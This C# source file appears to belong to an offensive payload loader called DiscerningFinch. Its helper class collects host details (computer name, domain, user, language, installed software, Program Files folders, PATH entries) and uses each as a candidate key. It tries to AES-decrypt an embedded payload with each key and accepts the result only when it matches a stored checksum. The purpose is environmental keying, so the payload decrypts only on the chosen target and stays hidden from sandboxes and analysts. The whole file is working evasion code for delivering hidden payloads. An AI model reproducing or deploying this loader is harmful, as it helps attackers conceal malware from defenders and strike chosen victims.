using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace DiscerningFinch
{
    class Helper
    {
        public static List<String> GetOsCryptoSeeds()
        {
            List<String> inputArray = new List<string>();

            // Computer name -> Case sensitive
            String Comp = Environment.GetEnvironmentVariable("COMPUTERNAME");
            if (!String.IsNullOrEmpty(Comp))
            {
                inputArray.Add(Comp);
            }

            // Domain name -> Case sensitive
            String Dom = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            if (!String.IsNullOrEmpty(Dom))
            {
                inputArray.Add(Dom);
            }

            // Language ID
            String LangID = CultureInfo.InstalledUICulture.LCID.ToString();
            if (!String.IsNullOrEmpty(LangID))
            {
                inputArray.Add(LangID);
            }

            // User name -> Case sensitive
            String User = Environment.UserName;
            if (!String.IsNullOrEmpty(User))
            {
                inputArray.Add(User);
            }

            // Installed software -> SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall -> subkeys -> DisplayName
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"))
            {
                foreach (string subkey_name in key.GetSubKeyNames())
                {
                    using (RegistryKey subkey = key.OpenSubKey(subkey_name))
                    {
                        try
                        {
                            String Soft = (String)subkey.GetValue("DisplayName");
                            if (!String.IsNullOrEmpty(Soft))
                            {
                                inputArray.Add(Soft);
                            }
                        }
                        catch { }
                    }
                }
            }

            // Folder names in "C:\Program Files"
            String[] sProgDirs = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
            foreach (String sDir in sProgDirs)
            {
                inputArray.Add(sDir.Split('\\').Last());
            }

            // Directories in the PATH
            String[] sPathArr = Environment.GetEnvironmentVariable("PATH").Split(';');
            if (sPathArr.Length > 0)
            {
                foreach (String sPath in sPathArr)
                {
                    inputArray.Add(sPath);
                }
            }

            // Return list
            return inputArray;
        }

        public static Byte[][] ComputeSha256KeyMat(String sInput)
        {
            Byte[][] res = new Byte[2][];
            Encoding enc = Encoding.UTF8;

            SHA256 sha256 = new SHA256CryptoServiceProvider();
            Byte[] hashKey = sha256.ComputeHash(enc.GetBytes(sInput));
            Byte[] hashIV = sha256.ComputeHash(enc.GetBytes(sInput));
            Array.Resize(ref hashIV, 16);

            res[0] = hashKey;
            res[1] = hashIV;

            return res;
        }

        public static Byte[] DecryptArrayFromAES256(String sInput, Byte[] bKey, Byte[] bIV)
        {
            Byte[] bCompressed = { };
            try
            {
                Byte[] cipherText = Convert.FromBase64String(sInput);

                if (cipherText == null || cipherText.Length <= 0)
                {
                    return bCompressed;
                }
                if (bKey == null || bKey.Length <= 0)
                {
                    return bCompressed;
                }
                if (bIV == null || bIV.Length <= 0)
                {
                    return bCompressed;
                }

                using (Aes aesAlg = Aes.Create())
                using (MemoryStream output = new MemoryStream())
                {
                    aesAlg.Key = bKey;
                    aesAlg.IV = bIV;

                    ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                    using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            Byte[] buffer = new Byte[1024];
                            Int32 read = csDecrypt.Read(buffer, 0, buffer.Length);
                            while (read > 0)
                            {
                                output.Write(buffer, 0, read);
                                read = csDecrypt.Read(buffer, 0, buffer.Length);
                            }
                            csDecrypt.Flush();
                            bCompressed = output.ToArray();
                        }
                    }
                }
                return bCompressed;
            }
            catch
            {
                return bCompressed;
            }
        }

        public static Byte[] GetArrayFromGzipArray(Byte[] bInput)
        {
            MemoryStream CompStream = new MemoryStream(bInput);
            var zipStream = new GZipStream(CompStream, CompressionMode.Decompress);
            MemoryStream DeCompStream = new MemoryStream();

            Byte[] buffer = new byte[2048];
            Int32 bytesRead;
            while ((bytesRead = zipStream.Read(buffer, 0, buffer.Length)) > 0)
            {
                DeCompStream.Write(buffer, 0, bytesRead);
            }

            zipStream.Close();
            return DeCompStream.ToArray();
        }

        public static Byte[] AESUnKeyB64(String sKey)
        {
            // Decrypt
            Byte[][] aSHAKeyMatt = ComputeSha256KeyMat(sKey);
            Byte[] bDecrypt = DecryptArrayFromAES256(Payload.sPayloadArray, aSHAKeyMatt[0], aSHAKeyMatt[1]);

            if (bDecrypt.Length > 0)
            {
                // Checksum ok?
                SHA256 sha256 = new SHA256CryptoServiceProvider();
                if (Convert.ToBase64String(sha256.ComputeHash(bDecrypt)) == Payload.sCheckSum)
                {
                    return bDecrypt;
                }
                else
                {
                    return new Byte[0];
                }
            } else
            {
                return new Byte[0];
            }
        }
    }
}
